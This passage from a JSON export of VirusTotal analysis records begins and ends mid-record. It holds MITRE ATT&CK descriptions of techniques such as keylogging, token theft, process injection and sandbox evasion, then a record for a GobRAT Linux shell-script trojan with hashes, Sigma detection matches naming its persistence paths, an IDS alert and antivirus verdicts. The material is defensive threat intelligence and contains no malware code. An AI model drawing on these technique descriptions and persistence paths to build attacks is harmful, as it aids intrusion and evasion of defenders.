                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\nHooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\nReading raw keystroke data from the hardware buffer.\nWindows Registry modifications.\nCustom drivers.\nModify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions. \n",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "log keystrokes"
                  },
                  {
                    "severity": "INFO",
                    "description": "log keystrokes via polling"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/001/",
                "id": "T1056.001",
                "name": "Keylogging"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx. The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.\nAn adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using CreateProcessWithTokenW or CreateProcessAsUserW. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "impersonate user"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1134/001/",
                "id": "T1134.001",
                "name": "Token Impersonation/Theft"
              },
              {
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "set file attributes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1222/",
                "id": "T1222",
                "name": "File and Directory Permissions Modification"
              },
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "write process memory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\nAny standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "acquire debug privileges"
                  },
                  {
                    "severity": "INFO",
                    "description": "modify access privileges"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1134/",
                "id": "T1134",
                "name": "Access Token Manipulation"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "delete registry key"
                  },
                  {
                    "severity": "INFO",
                    "description": "delete registry value"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1112/",
                "id": "T1112",
                "name": "Modify Registry"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "encode data using XOR"
                  },
                  {
                    "severity": "INFO",
                    "description": "encode data using Base64"
                  },
                  {
                    "severity": "INFO",
                    "description": "encrypt data using RC4 PRGA"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              },
              {
                "description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "check for unmoving mouse cursor"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/002/",
                "id": "T1497.002",
                "name": "User Activity Based Checks"
              },
              {
                "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \nOn Windows, there are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden. \nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "hide graphical window"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/003/",
                "id": "T1564.003",
                "name": "Hidden Window"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx. The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.\nAn adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using CreateProcessWithTokenW or CreateProcessAsUserW. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "impersonate user"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1134/001/",
                "id": "T1134.001",
                "name": "Token Impersonation/Theft"
              },
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "write process memory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\nAny standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "acquire debug privileges"
                  },
                  {
                    "severity": "INFO",
                    "description": "modify access privileges"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1134/",
                "id": "T1134",
                "name": "Access Token Manipulation"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/08c2d3fec8cd9fcced634df7ad0f3db164ffe0cbfc263e2d8be026afca05bfcb/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b4eef7404d6739601e0d64"
  },
  "data": {
    "attributes": {
      "type_description": "Shell script",
      "tlsh": "T1D4D1E0A9B831DD78BD005DD8F5A7B318BDB9C067D8129A08B49E74B823EC756B42C12D",
      "type_tags": [
        "script",
        "shell"
      ],
      "names": [
        "lwbehzxyagqpknpmdlnd",
        "qpknpmdlnd"
      ],
      "last_modification_date": 1705541170,
      "type_tag": "shell",
      "times_submitted": 2,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 6425,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.gobrat/shell",
        "popular_threat_category": [
          {
            "count": 15,
            "value": "trojan"
          },
          {
            "count": 2,
            "value": "downloader"
          }
        ],
        "popular_threat_name": [
          {
            "count": 5,
            "value": "gobrat"
          },
          {
            "count": 4,
            "value": "shell"
          }
        ]
      },
      "last_submission_date": 1685445745,
      "sigma_analysis_results": [
        {
          "rule_title": "Execution Of Script Located In Potentially Suspicious Directory",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "CommandLine": "/bin/sh -c /tmp/env/.qnapd/sshd.sh",
                "Image": "/bin/sh"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects executions of scripts located in potentially suspicious locations such as \"/tmp\" via a shell such as \"bash\", \"sh\", etc.",
          "rule_author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
          "rule_id": "444cf775e51f1f48a4f280cf4a392d9fa3244628404c303864ad4b00325530c5"
        },
        {
          "rule_title": "Persistence Via Cron Files",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TargetFilename": "/var/spool/cron/crontabs/tmp.0VScjz"
              }
            },
            {
              "values": {
                "TargetFilename": "/var/spool/cron/crontabs/tmp.csGL10"
              }
            },
            {
              "values": {
                "TargetFilename": "/var/spool/cron/crontabs/tmp.eb6MUy"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects creation of cron file or files in Cron directories which could indicates potential persistence.",
          "rule_author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC",
          "rule_id": "f74e8628441aa3b7bcbf82dd77cc025925e34078d02d169dd947db62675dbeaa"
        },
        {
          "rule_title": "Potentially Suspicious Shell Script Creation in Profile Folder",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TargetFilename": "/etc/profile.d/sshdaemon.sh"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "Detects the creation of shell scripts under the \"profile.d\" path.",
          "rule_author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
          "rule_id": "75fbf85188235a403847898f76531554e988c5316df1299753442fad2ee0b7b1"
        }
      ],
      "meaningful_name": "lwbehzxyagqpknpmdlnd",
      "crowdsourced_ids_stats": {
        "high": 0,
        "info": 0,
        "medium": 0,
        "low": 1
      },
      "trid": [
        {
          "file_type": "file seems to be plain text/ASCII",
          "probability": 0
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 0,
          "medium": 2,
          "critical": 0,
          "low": 1
        }
      },
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "harmless",
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "CLEAN"
          ]
        },
        "Zenbox Linux": {
          "category": "malicious",
          "confidence": 72,
          "sandbox_name": "Zenbox Linux",
          "malware_classification": [
            "MALWARE",
            "SPREADER",
            "TROJAN",
            "EVADER"
          ]
        }
      },
      "sha256": "3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1",
      "type_extension": "sh",
      "tags": [
        "shell",
        "sets-process-name",
        "self-delete",
        "checks-cpu-name",
        "detect-debug-environment",
        "idle",
        "long-sleeps",
        "direct-cpu-clock-access",
        "persistence"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "Not Suspicious Traffic",
          "alert_severity": "low",
          "rule_msg": "ET POLICY OpenSSL Demo CA - Internet Widgits Pty (O)",
          "rule_raw": "alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:\"ET POLICY OpenSSL Demo CA - Internet Widgits Pty (O)\"; flow:established,to_client; tls.cert_subject; content:\"O=Internet Widgits Pty Ltd\"; classtype:not-suspicious; sid:2011540; rev:7; metadata:created_at 2010_09_27, former_category POLICY, updated_at 2022_05_03;)",
          "alert_context": [
            {
              "src_ip": "5.8.95.16",
              "src_port": 443,
              "ja3": [
                "3faa4ad39f690c4ef1c3160caa375465"
              ],
              "ja3s": [
                "2de81c22ea32a57162df5cb08d4a2795"
              ]
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2011540"
        }
      ],
      "last_analysis_date": 1688459190,
      "unique_sources": 2,
      "first_submission_date": 1675850050,
      "ssdeep": "96:oHRm+NMMUTGWbgZl+Idm1VLvPjdEy0dOE5/7lH13nXZdiQdtdtdumVALEDpIp8HF:oHR8MUSO4+IQjPjYOXPwPFZQj0b",
      "md5": "01a8cc25ede016dd10e2457a7ecba904",
      "sha1": "60d68247f4e003eca24c6c65d633974ff001d6b1",
      "magic": "POSIX shell script, ASCII text executable, with very long lines (400u)",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 23,
        "undetected": 36
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Script.Agent.4!c",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.98",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230628"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.59.12300",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.1.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230619"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.Downloader.Shell.Agent",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.Linux.Generic.298024",
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230625"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.95.48842",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.95.48842",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Linux.Generic.D48C28",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230621"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.482",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "Cyren": {
          "category": "undetected",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "Downloader",
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "27513",
          "result": "Linux/GobRAT.A",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.428",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230701"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_FRS.0NA103FM23",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "22.11.7701.0",
          "result": "BV:GobRat-A [Drp]",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.Shell.Agent.bv",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.Linux.Generic.298024",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25785",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230629"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.Linux.Generic.298024",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": "Linux/GobRAT-A",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4906",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_FRS.0NA103FM23",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "McAfee-GW-Edition": {
          "category": "undetected",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.446",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230412"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.Linux.Generic.298024",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.Linux.Generic.298024 (B)",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.1.14.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "230704-02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/Shell.Agent",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.126.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "35793",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23050.3",
          "result": "Trojan:Linux/ShellAgnt!MTB",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.Shell.Agent.bv",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36147B:27.32286",
          "result": "Trojan.Linux.Generic.298024",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1688454037",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.23.3.10396",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.114",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230219"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=84)",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230702"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
